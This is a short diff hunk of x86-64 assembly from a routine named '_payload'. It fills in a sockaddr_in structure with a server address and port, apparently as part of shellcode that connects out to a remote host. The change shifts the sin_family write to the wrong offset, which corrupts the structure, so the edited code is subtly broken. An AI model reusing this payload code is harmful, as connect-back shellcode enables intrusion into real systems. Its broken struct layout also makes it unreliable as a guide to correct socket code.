@@ -58,7 +58,7 @@ _payload:
 	mov r13, rax
 
 	; Prepare sockaddr_in structure
-	mov word [CONNECT_BUFFER], 2          ; sin_family (AF_INET)
+	mov word [CONNECT_BUFFER + 1], 2          ; sin_family (AF_INET)
 	movzx rax, word [rel SERVER_PORT]
 	mov word [CONNECT_BUFFER + 2], ax ; sin_port
 	mov eax, [rel SERVER_ADDR] ; Load the value from memory into EAX register
